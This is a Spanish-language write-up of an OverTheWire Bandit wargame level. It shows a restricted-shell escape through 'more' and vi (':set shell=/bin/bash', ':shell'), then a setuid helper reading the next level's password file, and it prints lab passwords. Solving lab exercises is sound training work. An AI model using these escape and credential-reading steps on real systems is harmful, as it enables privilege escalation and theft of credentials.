## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!

## Datos Acceso
bandit26 
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

## Solución
```
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)
v
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
"~/text.txt" [readonly] 6L, 258B
:set shell=/bin/bash
:shell
[No write since last change]
bandit26@bandit:~$ bandit26@bandit:~$ ls
bandit27-do text.txt
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$
bandit26@bandit:~$ exit
:qa!
q
```

## Notas Adicionales
Intento entrar al 26 y directamente me saca

Es con el mismo truco que en el nivel 25 - 26
Hacer pequeña la pantalla para que se quede en more

El único problema es que estamos en bandit26 y necesitamos ser bandit27.

* **esc : qa! para salir del vi**

v nos va a meter al editor
nos salimos a la línea de comando

En lugar de editar un archivo, voy a asignar a shell el valor de bin bash



## Referencias
